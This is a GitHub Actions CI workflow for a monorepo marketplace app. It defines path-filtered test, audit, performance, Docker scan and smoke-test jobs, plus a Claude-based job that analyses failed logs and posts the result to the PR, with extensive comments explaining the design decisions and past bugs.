name: CI

on:
  push:
    branches: [main]
  pull_request:
  # Lets ai-code-review force-run a specific skipped job when it disagrees
  # with the path filter's decision for a given diff (see that job's own
  # comment below for why this exists and how it's constrained). Also
  # available for a human to trigger by hand from the Actions tab if ever
  # needed — `force_jobs` just defaults to empty, running nothing extra.
  workflow_dispatch:
    inputs:
      force_jobs:
        description: "Comma-separated job IDs to force-run despite the path filter (audit, test-api-unit, test-api-e2e, test-web, perf-budget, load-test, docker-scan, docker-smoke, test-e2e-web)"
        required: false
        type: string
        default: ""

jobs:
  # Split into small, independent jobs on purpose — GitHub runs jobs with
  # no `needs:` between them concurrently, on separate runners. Lint and
  # audit don't need Postgres/Redis; the two prod-image scans don't need
  # each other or the dev-stack smoke test. Keeping them as one big job
  # (as this file used to) forces everything through one runner in
  # sequence for no reason — total wall-clock time was the sum of every
  # step, not the slowest one.

  # Feeds the path-based `if:` conditions below. lint, migrate, and
  # ai-failure-analysis remain NOT filtered:
  #   - lint currently lints both apps in one combined command (not split
  #     per-app), so its real skip condition is the union of both apps'
  #     paths anyway — no separate filtering to be gained without first
  #     splitting the job itself.
  #   - migrate runs `prisma migrate deploy` against production, already a
  #     fast no-op with nothing new to apply — the risk of a filter
  #     incorrectly skipping a real migration outweighs the seconds saved.
  #   - ai-failure-analysis reacts to `failure()`, not to the diff itself —
  #     doesn't make sense to path-filter something whose entire job is
  #     "respond to whatever just failed."
  # test-api-unit/test-api-e2e/test-web/audit/perf-budget/load-test/
  # docker-smoke/docker-scan ARE filtered (`docker` — both Dockerfiles
  # build off a SHARED `deps` stage: a workspace-root `pnpm install` that
  # runs apps/api's `prisma generate` postinstall even for the web image,
  # see apps/web/Dockerfile's own comment — so the filter covers both apps
  # together, not each app's effect on the image separately).
  # docker-scan (Trivy) has a real trade-off docker-smoke's purely-
  # deterministic behavioral test doesn't: it checks against an external,
  # time-varying CVE database, so filtering it means losing the
  # incidental re-scan coverage it used to get from running on every
  # push. That gap is closed properly instead of left as an accepted
  # loss — see docker-scan-scheduled.yml, a weekly cron re-scan
  # independent of what any given push touches, the same reasoning
  # codeql.yml already uses for its own schedule trigger.
  changes:
    name: Detect changed paths
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      deps: ${{ steps.filter.outputs.deps }}
      docker: ${{ steps.filter.outputs.docker }}
    steps:
      - uses: actions/checkout@v7
      # workflow_dispatch has no PR/push diff for dorny/paths-filter to
      # compare against — not attempting it there avoids depending on
      # unconfirmed behavior for a trigger type it isn't designed for.
      # Harmless either way: every forceable job's `if:` already has an
      # independent `force_jobs` OR-clause (below), so a workflow_dispatch
      # run reaches the jobs it's meant to regardless of what (if
      # anything) this step produces for that trigger type.
      #
      # A real regression lived here for ~14 hours (2026-08-16, from PR #33
      # to this fix): the `if:` below used to read only `== 'pull_request'`
      # — the comment above only ever reasoned about excluding
      # workflow_dispatch, but the condition as written also excluded
      # `push`, silently skipping every path-filtered job (test-api-unit,
      # test-api-e2e, test-web, audit, perf-budget, load-test, docker-scan,
      # docker-smoke) on every push to main. Runs still reported "success"
      # since a skipped job doesn't fail a run — nothing surfaced this
      # until the coverage/Lighthouse badges stopped updating and that got
      # investigated. `!= 'workflow_dispatch'` states the actual intent
      # directly instead of enumerating the events that should run it.
      #
      # Per dorny/paths-filter's own docs ("Master, Release, or other
      # long-lived branches"): a push event additionally needs `base: ${{
      # github.ref }}` to diff against "the most recent commit on the same
      # branch before the push" — without it, the default (compare against
      # the repo's default branch) compares the just-pushed commit against
      # itself on a push *to* that same default branch, producing an empty
      # diff. `base` is documented as ignored for `pull_request` events
      # (unless `token` is overridden, which it isn't here), so setting it
      # unconditionally is safe and doesn't change PR behavior.
      - uses: dorny/paths-filter@v4
        id: filter
        if: github.event_name != 'workflow_dispatch'
        with:
          base: ${{ github.ref }}
          filters: |
            deps:
              - 'package.json'
              - 'pnpm-lock.yaml'
              - 'pnpm-workspace.yaml'
            api:
              - 'apps/api/**'
            web:
              - 'apps/web/**'
            # Explicit files, not a broad `scripts/**` glob — verified by
            # reading both Dockerfiles (explicitly scoped COPY, no
            # `COPY . .`, so scripts/ and .github/ genuinely never enter
            # either image), docker-compose.yml (build context is the
            # repo root, used by scripts/dev.sh), .dockerignore (directly
            # controls the build context), and the docker-scan/docker-
            # smoke job steps themselves (docker-scan runs `docker build`
            # directly; docker-smoke runs `./scripts/dev.sh`, which is
            # `docker compose` under the hood). scripts/dev.sh specifically
            # — not scripts/** — because a first draft of this filter
            # would have excluded it along with the rest of scripts/,
            # which is exactly the file docker-smoke's job exists to
            # exercise. Everything else under scripts/ (the ai-code-review
            # /pr-reconciliation tooling) is confirmed unreferenced by
            # either Dockerfile and stays excludable.
            docker:
              - 'apps/api/**'
              - 'apps/web/**'
              - 'apps/api/Dockerfile'
              - 'apps/web/Dockerfile'
              - 'docker-compose.yml'
              - '.dockerignore'
              - 'scripts/dev.sh'
              - 'package.json'
              - 'pnpm-lock.yaml'
              - 'pnpm-workspace.yaml'

      # Surfaces the run/skip decision on the PR itself instead of making
      # someone reconstruct it from each job's `if:` in this file. Edits
      # its own prior comment (found via the HTML-comment marker) rather
      # than posting a new one on every push to the same PR.
      - name: Comment skip logic on PR
        if: github.event_name == 'pull_request'
        env:
          GH_TOKEN: ${{ github.token }}
          API_CHANGED: ${{ steps.filter.outputs.api }}
          WEB_CHANGED: ${{ steps.filter.outputs.web }}
          DEPS_CHANGED: ${{ steps.filter.outputs.deps }}
          DOCKER_CHANGED: ${{ steps.filter.outputs.docker }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          status() {
            if [ "$1" = "true" ]; then echo "▶️ run"; else echo "⏭️ skip"; fi
          }

          api_or_deps=false
          if [ "$API_CHANGED" = "true" ] || [ "$DEPS_CHANGED" = "true" ]; then api_or_deps=true; fi

          web_or_deps=false
          if [ "$WEB_CHANGED" = "true" ] || [ "$DEPS_CHANGED" = "true" ]; then web_or_deps=true; fi

          # test-e2e-web is a full-stack integration test (real API +
          # DB), unlike test-web's mocked Vitest/jsdom suite — gated on
          # api too, not just web/deps. See that job's own comment.
          api_or_web_or_deps=false
          if [ "$API_CHANGED" = "true" ] || [ "$WEB_CHANGED" = "true" ] || [ "$DEPS_CHANGED" = "true" ]; then api_or_web_or_deps=true; fi

          cat > /tmp/skip-comment.md <<EOF
          <!-- ci-skip-logic-comment -->
          ### 🔍 CI job skip logic

          Changed paths detected: \`api=$API_CHANGED\` · \`web=$WEB_CHANGED\` · \`deps=$DEPS_CHANGED\` · \`docker=$DOCKER_CHANGED\`

          | Job | Status | Runs when |
          |---|---|---|
          | Dependency audit | $(status "$DEPS_CHANGED") | deps changed |
          | API unit tests | $(status "$api_or_deps") | api or deps changed |
          | API e2e tests | $(status "$api_or_deps") | api or deps changed |
          | API load test (autocannon) | $(status "$api_or_deps") | api or deps changed |
          | Web build + tests | $(status "$web_or_deps") | web or deps changed |
          | Web performance budget (Lighthouse) | $(status "$web_or_deps") | web or deps changed |
          | Web e2e (Playwright) | $(status "$api_or_web_or_deps") | api, web, or deps changed |
          | Docker image vulnerability scan | $(status "$DOCKER_CHANGED") | apps/api, apps/web, either Dockerfile, docker-compose.yml, .dockerignore, scripts/dev.sh, or deps changed |
          | Docker dev stack smoke test | $(status "$DOCKER_CHANGED") | same as above |

          Lint always runs regardless of what changed — see the \`changes\` job's own comment in \`ci.yml\` for why. Docker image vulnerability scan also runs weekly regardless of any push, in a separate scheduled workflow — see \`docker-scan-scheduled.yml\`.
          EOF

          existing_id=$(gh api "repos/${{ github.repository }}/issues/$PR_NUMBER/comments" --paginate --jq '.[] | select(.body | startswith("<!-- ci-skip-logic-comment -->")) | .id' | head -1)

          # -F (typed field), not -f (raw-field): only -F documents "@<path>"
          # to read a parameter's value from a file — -f treats "@..." as a
          # literal string. Discovered live: every other push to a PR was
          # silently overwriting this comment's body with the literal text
          # "@/tmp/skip-comment.md" instead of its actual content, which
          # also destroys the "<!-- ci-skip-logic-comment -->" marker this
          # same lookup depends on — so the NEXT push can no longer find the
          # (now-corrupted) comment, falls through to creating a fresh one,
          # and the cycle repeats: one broken comment left behind every
          # other push, forever, on every PR that gets more than one push.
          if [ -n "$existing_id" ]; then
            gh api -X PATCH "repos/${{ github.repository }}/issues/comments/$existing_id" -F body=@/tmp/skip-comment.md > /dev/null
          else
            gh pr comment "$PR_NUMBER" --body-file /tmp/skip-comment.md
          fi

      # Deliberately independent of the filter step's own `if:` — this
      # asserts the actual requirement (the filter must run for every
      # real trigger except workflow_dispatch) rather than re-deriving it
      # from whatever that step's condition currently says. If a future
      # edit reintroduces this bug in a *different* shape (a typo, an
      # overly-narrow rewrite, anything), this still catches it, because
      # it doesn't trust the filter step's own condition to be correct —
      # only its actual outcome.
      #
      # This is exactly the failure mode that shipped silently for ~14
      # hours (2026-08-16, PR #33 to the fix): the filter step's `if:`
      # accidentally excluded `push`, so every path-filtered job
      # (test-api-unit, test-web, audit, perf-budget, load-test,
      # docker-scan, docker-smoke) silently skipped on every push to
      # main. Runs still showed green — a skipped job doesn't fail a
      # run — so nothing surfaced it until the coverage/Lighthouse
      # badges stopped updating and that got investigated by hand. See
      # CLAUDE.md's note on this same job for the full story.
      #
      # `changes` is in `migrate`'s `needs:` list specifically so this
      # failing actually blocks deploy via `migrate`'s existing
      # `!contains(needs.*.result, 'failure')` gate — not just a
      # cosmetic red job nobody looks at.
      - name: Verify the path filter actually ran
        if: github.event_name != 'workflow_dispatch'
        run: |
          if [ "${{ steps.filter.outcome }}" != "success" ]; then
            echo "::error::dorny/paths-filter did not run successfully for event '${{ github.event_name }}' (outcome: '${{ steps.filter.outcome }}'). Every path-filtered job downstream will silently skip. Check this step's own if: condition in ci.yml."
            exit 1
          fi

  lint:
    name: Lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint:check

  # A live review caught that scripts/lib/pr-reconciliation.mjs's tests
  # only ever ran inside pr-reconciliation.yml's own steps — a workflow
  # that never triggers on `pull_request`, only on close/schedule/manual
  # dispatch. A regression here would ship straight to main, unnoticed by
  # this PR's own CI, and only surface much later when pr-reconciliation
  # .yml next actually ran. This job closes that gap: same tests, run as
  # part of every regular PR's gate instead. Unconditional (not path-
  # filtered) — zero npm dependencies to install (pure Node built-ins),
  # so there's no real cost to just always running it, and one less
  # filter surface to get wrong on a file that's already had plenty of
  # those.
  test-ci-scripts:
    name: Test CI/reconciliation scripts
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: 22
      - run: node --test scripts/lib/pr-reconciliation.test.mjs
      - run: node --test scripts/lib/pre-push-refs.test.mjs
      - run: node --test scripts/coverage-dashboard/chart-math.test.mjs
      - run: bash scripts/publish-badge.test.sh
      - run: bash scripts/check-outdated.test.sh

  audit:
    name: Dependency audit
    runs-on: ubuntu-latest
    needs: [changes]
    # Only scans the lockfile for known vulnerabilities — irrelevant to
    # source changes with no dependency bump. The workflow_dispatch clause
    # lets ai-code-review (or a human) force this to run despite the skip
    # — see that job's own comment for why/how this is constrained.
    if: needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'audit'))
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      # high/critical only — a moderate advisory in a load-test-only dev
      # dependency (autocannon's transitive uuid) shouldn't block every
      # PR; it should still show up in `pnpm audit` output for a human
      # to notice and track.
      - run: pnpm audit --audit-level=high

  # The old single "Test" job ran API unit tests, API e2e tests, and the web
  # build+tests back to back on one runner even though none of the three
  # depend on each other's output — split for the same reason docker-scan
  # and docker-smoke are separate jobs (see the file-level comment above).
  #
  # Only test-api-e2e touches a real database — API unit tests mock
  # PrismaService entirely (see src/**/*.service.spec.ts) and the web tests
  # don't touch Postgres at all, so those two jobs skip the `services:`
  # block completely rather than pay for a container they never use. Redis
  # is dropped too: OtpStoreService is in-memory only today (see its
  # TODO(Phase 1) comment) — nothing in this repo talks to Redis yet, so the
  # service container CI had been starting for every run was pure dead
  # weight.

  test-api-unit:
    name: API unit tests
    runs-on: ubuntu-latest
    needs: [changes]
    # deps too, not just api — a root dependency bump (e.g. a Dependabot
    # PR touching only package.json/pnpm-lock.yaml) can affect the API
    # even though no apps/api/** file changed.
    if: needs.changes.outputs.api == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'test-api-unit'))
    # contents: write only matters for the badge-publish step below, which
    # is itself gated to push-to-main only — PRs never touch gh-pages.
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: API unit tests (with coverage)
        working-directory: apps/api
        run: pnpm test:cov

      # Publishes a shields.io endpoint-badge JSON (README's "API coverage"
      # badge reads it live from gh-pages) — main only, so an in-progress
      # PR's coverage never overwrites the badge before it's actually merged.
      # Also appends this run's {date, commit, pct} to coverage/api-history
      # .json on the same branch — the time series coverage/index.html
      # charts. Skipped (not run at all) whenever test-api-unit itself is
      # path-filtered out, which is the correct semantic: coverage didn't
      # actually get re-measured, so no new data point should be recorded.
      - name: Publish API coverage badge
        if: github.ref == 'refs/heads/main' && github.event_name == 'push'
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          pct=$(jq '.total.statements.pct' apps/api/coverage/coverage-summary.json)
          color=$(awk -v p="$pct" 'BEGIN { if (p>=90) print "brightgreen"; else if (p>=75) print "yellow"; else if (p>=50) print "orange"; else print "red" }')
          echo "{\"schemaVersion\":1,\"label\":\"api coverage\",\"message\":\"${pct}%\",\"color\":\"${color}\"}" > /tmp/api-badge.json
          ./scripts/publish-badge.sh api /tmp/api-badge.json "$pct" "${{ github.sha }}"

  test-api-e2e:
    name: API e2e tests
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.api == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'test-api-e2e'))
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: medinstru
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10

    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: Configure API env
        working-directory: apps/api
        run: cp .env.example .env

      - name: Apply dev-DB migrations
        working-directory: apps/api
        run: pnpm exec prisma migrate deploy

      - name: API e2e tests
        working-directory: apps/api
        run: pnpm run test:e2e:migrate && pnpm test:e2e

  test-web:
    name: Web build + tests
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.web == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'test-web'))
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: Web build + tests (with coverage)
        working-directory: apps/web
        run: pnpm build && pnpm exec vitest run --coverage

      # See "Publish API coverage badge" above for why the extra two args
      # (pct, commit sha) are passed — same history-appending mechanism,
      # coverage/web-history.json instead of coverage/api-history.json.
      - name: Publish web coverage badge
        if: github.ref == 'refs/heads/main' && github.event_name == 'push'
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          pct=$(jq '.total.statements.pct' apps/web/coverage/coverage-summary.json)
          color=$(awk -v p="$pct" 'BEGIN { if (p>=90) print "brightgreen"; else if (p>=75) print "yellow"; else if (p>=50) print "orange"; else print "red" }')
          echo "{\"schemaVersion\":1,\"label\":\"web coverage\",\"message\":\"${pct}%\",\"color\":\"${color}\"}" > /tmp/web-badge.json
          ./scripts/publish-badge.sh web /tmp/web-badge.json "$pct" "${{ github.sha }}"

  docker-scan:
    name: Docker image vulnerability scan
    runs-on: ubuntu-latest
    needs: [changes]
    # Now path-filtered the same as docker-smoke — the CVE-freshness
    # concern (Trivy scans an external, time-varying database, so running
    # on every push incidentally re-scans the unchanged image, catching
    # newly-disclosed CVEs) is real, but the fix for it is an explicit
    # scheduled re-scan, not leaving this job's path filter permanently
    # loose as an accidental substitute. See
    # docker-scan-scheduled.yml — same scan, weekly cron, independent of
    # what any given push touches, mirroring codeql.yml's own reasoning
    # for its schedule trigger ("a push-only trigger would miss newly-
    # disclosed vulnerability patterns in code that hasn't changed").
    if: needs.changes.outputs.docker == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'docker-scan'))
    steps:
      - uses: actions/checkout@v7

      - name: Build prod images (build-only — no secrets available here to run them with)
        run: |
          docker build --target prod -f apps/api/Dockerfile -t marketplace-api:prod .
          docker build --target prod -f apps/web/Dockerfile -t marketplace-web:prod .

      - name: Scan API prod image
        uses: aquasecurity/trivy-action@v0.36.0
        with:
          scan-type: image
          image-ref: marketplace-api:prod
          severity: HIGH,CRITICAL
          exit-code: "1"

      - name: Scan web prod image
        uses: aquasecurity/trivy-action@v0.36.0
        with:
          scan-type: image
          image-ref: marketplace-web:prod
          severity: HIGH,CRITICAL
          exit-code: "1"

  docker-smoke:
    name: Docker dev stack smoke test
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.docker == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'docker-smoke'))
    steps:
      - uses: actions/checkout@v7

      # scripts/dev.sh builds its own `dev`-target images from scratch —
      # entirely independent of docker-scan's `prod`-target build above,
      # so this doesn't need to wait for that job at all.
      - name: Bootstrap the dev stack
        run: ./scripts/dev.sh

      - name: Smoke test
        run: |
          curl -sf http://localhost:3000/en > /dev/null
          response=$(curl -sf -X POST http://localhost:4000/graphql \
            -H "Content-Type: application/json" \
            -d '{"query":"{ productsPaged(page: 1, pageSize: 10) { totalCount } }"}')
          echo "$response"
          echo "$response" | grep -q '"totalCount":10'

      - name: Tear down
        if: always()
        run: docker compose down -v

  # Both jobs below wire up scripts that already existed (apps/web/scripts/
  # perf-budget.mjs, apps/api/scripts/load-test.mjs) but only ever ran
  # manually. Deliberately *not* `continue-on-error: true` — Lighthouse
  # scores and load-test latency have real run-to-run variance, so a
  # failure here isn't necessarily a real regression, but it's still
  # worth AI analysis rather than being silently masked (continue-on-error
  # hides a job's real outcome from `needs.<job>.result`/`failure()` for
  # anything downstream, which would make ai-failure-analysis below unable
  # to see these failures at all). They still can't block a merge on their
  # own: neither is in `migrate`'s `needs:` list or branch protection's
  # required checks — that's what actually keeps them "informational".

  perf-budget:
    name: Web performance budget (Lighthouse)
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.web == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'perf-budget'))
    # contents: write only matters for the badge-publish step below, which
    # is itself gated to push-to-main only -- PRs never touch gh-pages.
    # Same reasoning as test-api-unit/test-web's identical block. This job
    # was missing it: the repo's default_workflow_permissions is "read"
    # (confirmed via `gh api repos/nixsin/marketplace/actions/permissions/
    # workflow`), so without an explicit override the badge-publish step's
    # push to gh-pages fails with a 403 -- discovered live when this job
    # failed on a push-to-main run (test-web's own badge-publish, on the
    # same run, succeeded specifically because it already had this block).
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      # No live API in this job — keeping it self-contained and fast beats
      # wiring up Postgres/migrations/seeding just for an informational
      # check. This measures the shell's own load performance (exactly
      # what the service worker in this repo targets), not a fully
      # product-populated page; the product list will show its fetch-error
      # state, which still paints and still gets measured.
      - name: Build web
        working-directory: apps/web
        run: pnpm build

      - name: Run Lighthouse performance budget
        working-directory: apps/web
        run: pnpm test:perf
        env:
          PERF_BUDGET_RESULT_FILE: /tmp/lighthouse-result.json

      # if: always() (scoped to push-to-main only, not every rerun) so a
      # real regression still lands in the history/dashboard instead of
      # silently freezing at the last passing score — unlike the coverage
      # badges above, going under budget is a hard failure for this job,
      # and hiding that from the trend the dashboard exists to show would
      # defeat the point. The required-check behavior itself (blocking a
      # PR until the budget is met) is unaffected — that's this job's own
      # exit code, not this step.
      - name: Publish Lighthouse performance badge
        if: always() && github.ref == 'refs/heads/main' && github.event_name == 'push'
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          if [ ! -f /tmp/lighthouse-result.json ]; then
            echo "No Lighthouse result file (Lighthouse itself likely crashed before writing one) — skipping badge publish."
            exit 0
          fi
          score=$(jq '.score' /tmp/lighthouse-result.json)
          # Lighthouse's own official score-color convention (0-49 red,
          # 50-89 orange, 90-100 green), not the 4-tier coverage-badge
          # scheme above — this is what a Lighthouse score reader expects.
          color=$(awk -v s="$score" 'BEGIN { if (s>=90) print "brightgreen"; else if (s>=50) print "orange"; else print "red" }')
          echo "{\"schemaVersion\":1,\"label\":\"lighthouse\",\"message\":\"${score}/100\",\"color\":\"${color}\"}" > /tmp/lighthouse-badge.json
          ./scripts/publish-badge.sh lighthouse /tmp/lighthouse-badge.json "$score" "${{ github.sha }}"

  # Informational, not required — this is the first test in the repo that
  # runs in a real browser engine at all (every other web test is a
  # Vitest/jsdom component test, which never executes real browser code).
  # Starts informational the same way perf-budget/Lighthouse itself did,
  # promoted to required only once proven stable — see CLAUDE.md.
  #
  # Chromium only, deliberately: this closes the "zero real-browser
  # coverage" gap first; a multi-engine or full BrowserStack-style
  # device/OS matrix is a separate, later decision once this proves
  # valuable — see playwright.config.ts's own comment and CLAUDE.md.
  #
  # Gated on `api` too, not just `web`/`deps`, unlike test-web — a real
  # gap an AI review round caught. Unlike test-web (Vitest/jsdom,
  # mocked), this suite is a genuine full-stack integration test: its
  # pagination assertion exercises real apps/api business logic
  # (products.service.ts's findPaged, real Prisma queries against
  # seeded data), not just the UI. An API-only change to that logic
  # could break the catalog flow without this filter ever noticing.
  test-e2e-web:
    name: Web e2e (Playwright)
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.web == 'true' || needs.changes.outputs.api == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'test-e2e-web'))
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: medinstru
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10

    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: Configure API env
        working-directory: apps/api
        run: cp .env.example .env

      - name: Apply dev-DB migrations
        working-directory: apps/api
        run: pnpm exec prisma migrate deploy

      - name: Seed sample data
        working-directory: apps/api
        run: pnpm seed
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/medinstru?schema=public

      # Real prod-style build + start (same as load-test.mjs's own
      # approach), not `nest start --watch` — this is testing the actual
      # thing that gets deployed, not a dev server with different
      # behavior (HMR, unminified errors, etc).
      - name: Build and start API
        working-directory: apps/api
        run: |
          pnpm build
          nohup node --enable-source-maps dist/src/main.js > /tmp/api.log 2>&1 &
          for i in $(seq 1 30); do
            curl -sf http://localhost:4000/ > /dev/null && exit 0
            sleep 1
          done
          echo "API did not become ready in time:"
          cat /tmp/api.log
          exit 1
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/medinstru?schema=public

      - name: Build web
        working-directory: apps/web
        run: pnpm build
        env:
          NEXT_PUBLIC_API_URL: http://localhost:4000/graphql

      - name: Start web
        working-directory: apps/web
        run: |
          nohup pnpm start -p 3000 > /tmp/web.log 2>&1 &
          for i in $(seq 1 30); do
            curl -sf http://localhost:3000/en > /dev/null && exit 0
            sleep 1
          done
          echo "Web did not become ready in time:"
          cat /tmp/web.log
          exit 1

      - name: Install Playwright's Chromium browser
        working-directory: apps/web
        run: pnpm exec playwright install --with-deps chromium

      - name: Run Playwright e2e suite
        working-directory: apps/web
        run: pnpm test:e2e
        env:
          PLAYWRIGHT_BASE_URL: http://localhost:3000
          CI: true

      # A visual diff or a functional failure both need to be inspectable
      # after the fact — the terminal summary alone doesn't show *what*
      # changed. Playwright's own HTML report bundles the actual/
      # expected/diff PNGs for every failed toHaveScreenshot() call, so
      # this is the minimum viable "informational" version of this check:
      # a human can download and open it. See CLAUDE.md for the planned
      # follow-up (posting the diff images directly to the PR instead of
      # requiring a report download).
      - name: Upload Playwright report
        if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: playwright-report
          path: apps/web/playwright-report/
          retention-days: 14

  load-test:
    name: API load test (autocannon)
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.api == 'true' || needs.changes.outputs.deps == 'true' || (github.event_name == 'workflow_dispatch' && contains(github.event.inputs.force_jobs, 'load-test'))
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: medinstru
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10

    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: Configure API env
        working-directory: apps/api
        run: cp .env.example .env

      - name: Apply dev-DB migrations
        working-directory: apps/api
        run: pnpm exec prisma migrate deploy

      # Real product rows, not an empty table — an empty-table query would
      # under-report latency for the thing this actually needs to catch
      # (e.g. an accidental N+1 query, per load-test.mjs's own comment).
      - name: Seed sample data
        working-directory: apps/api
        run: pnpm seed
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/medinstru?schema=public

      - name: Run API load test
        working-directory: apps/api
        run: pnpm test:load
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/medinstru?schema=public

  ai-failure-analysis:
    name: AI CI failure analysis
    runs-on: ubuntu-latest
    # PR-only: a push-to-main failure has no PR thread to comment on, and
    # this job's whole point is posting a comment there. Explicit
    # needs.*.result check instead of the plain `failure()` this used to
    # be — now that test-api-unit/test-api-e2e/test-web/audit/perf-budget/
    # load-test can be genuinely SKIPPED (path filtering, see the
    # `changes` job), this needs to fire on a real failure among its
    # dependencies while treating a skip as a non-event, not as something
    # that should suppress or falsely trigger analysis. `always()` forces
    # this job's own `if:` to actually be evaluated regardless of upstream
    # outcomes, since a skipped/failed dependency can otherwise cause a
    # downstream job to be skipped automatically before its own condition
    # is even checked.
    if: |
      always() &&
      github.event_name == 'pull_request' &&
      contains(needs.*.result, 'failure')
    needs:
      [
        lint,
        test-ci-scripts,
        audit,
        test-api-unit,
        test-api-e2e,
        test-web,
        docker-scan,
        docker-smoke,
        perf-budget,
        load-test,
        test-e2e-web,
      ]
    permissions:
      contents: read
      pull-requests: write
      actions: read
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      # `gh run view` — both `--log-failed` on the whole run AND
      # `--job <id> --log-failed` on a single job — refuses to return
      # anything until the *entire run* completes, including this job
      # itself. Verified this the hard way: switching to per-job fetching
      # still hit the same "run ... is still in progress" error. The raw
      # REST endpoint doesn't have that problem — it's scoped to a single
      # job's own completion, not the run's — so hit it directly via
      # `gh api` instead of going through `gh run view` at all. It returns
      # the full job log (no failed-steps-only filtering, unlike
      # --log-failed), but that's fine: the analysis script already keeps
      # only the tail of the log, where the actual error almost always is.
      - name: Fetch failed step logs
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          failed_job_ids=$(gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/jobs" --paginate --jq '.jobs[] | select(.conclusion == "failure") | .id')

          : > /tmp/failed-logs.txt
          if [ -z "$failed_job_ids" ]; then
            echo "No failed jobs found in this run." > /tmp/failed-logs.txt
          else
            for job_id in $failed_job_ids; do
              echo "=== Job $job_id ===" >> /tmp/failed-logs.txt
              gh api --allow-escape-sequences "repos/${{ github.repository }}/actions/jobs/$job_id/logs" >> /tmp/failed-logs.txt
            done
          fi

      - name: Analyze failure with Claude
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: node scripts/analyze-ci-failure.mjs /tmp/failed-logs.txt > /tmp/analysis.md

      - name: Post analysis as PR comment
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          {
            echo "### 🤖 AI failure analysis (Claude Haiku 4.5)"
            echo
            cat /tmp/analysis.md
            echo
            echo "_Automated analysis — verify before acting on it._"
          } > /tmp/comment.md
          gh pr comment "${{ github.event.pull_request.number }}" --body-file /tmp/comment.md

